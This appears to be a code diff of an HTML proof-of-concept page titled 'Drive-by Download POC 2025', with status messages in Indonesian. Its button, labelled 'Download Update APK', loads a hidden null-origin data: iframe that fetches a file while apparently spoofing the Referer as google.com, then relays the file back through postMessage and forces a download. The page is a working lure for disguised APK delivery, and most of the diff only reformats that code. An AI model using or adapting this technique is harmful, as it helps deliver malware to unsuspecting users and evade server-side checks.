@@ -4,27 +4,50 @@
   <meta charset="utf-8">
   <title>Drive-by Download POC 2025</title>
   <style>
-    body {font-family: Arial; text-align:center; padding:50px; background:#f9f9f9;}
-    button {background:#4CAF50; color:white; padding:16px 40px; font-size:18px; border:none; border-radius:12px; cursor:pointer;}
-    #status {margin-top:20px; font-weight:bold; color:#333;}
+    body {
+      font-family: Arial; 
+      text-align: center; 
+      padding: 50px; 
+      background: #f9f9f9;
+    }
+    button {
+      background: #4CAF50; 
+      color: white; 
+      padding: 16px 40px; 
+      font-size: 18px; 
+      border: none; 
+      border-radius: 12px; 
+      cursor: pointer;
+    }
+    button:hover {
+      background: #45a049;
+    }
+    #status {
+      margin-top: 20px; 
+      font-weight: bold; 
+      color: #333;
+    }
   </style>
 </head>
 <body>
-
   <h2>Drive-by Download POC (2025)</h2>
   <button onclick="startDownload()">Download Update APK</button>
   <div id="status">Status: Siap</div>
-
+  
   <script>
   function startDownload() {
     document.getElementById('status').textContent = 'Status: Sedang memproses...';
-
+    
     // Buat iframe dengan origin null
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
     
-    iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
+    // Kode yang akan dijalankan di iframe
+    const iframeCode = `
       <!DOCTYPE html>
+      <html>
+      <head><meta charset="utf-8"></head>
+      <body>
       <script>
       (async () => {
         try {
@@ -36,16 +59,19 @@
           });
           const blob = await r.blob();
           const url = URL.createObjectURL(blob);
-          parent.postMessage({type:'OK', url:url}, '*');
+          parent.postMessage({type: 'OK', url: url}, '*');
         } catch(e) {
-          parent.postMessage({type:'ERR', msg:e.message}, '*');
+          parent.postMessage({type: 'ERR', msg: e.message}, '*');
         }
       })();
-      </script>
-    `);
-
+      <\/script>
+      </body>
+      </html>
+    `;
+    
+    iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(iframeCode);
     document.body.appendChild(iframe);
-
+    
     // Terima pesan dari iframe
     const handler = (e) => {
       if (e.data.type === 'OK') {
@@ -57,7 +83,6 @@
         document.body.removeChild(a);
         URL.revokeObjectURL(e.data.url);
         iframe.remove();
-
         document.getElementById('status').textContent = 
           'Selesai! Cek Network → Referer: https://www.google.com/';
         
@@ -67,7 +92,7 @@
         document.getElementById('status').textContent = 'Error: ' + e.data.msg;
       }
     };
-
+    
     window.addEventListener('message', handler);
   }
   </script>
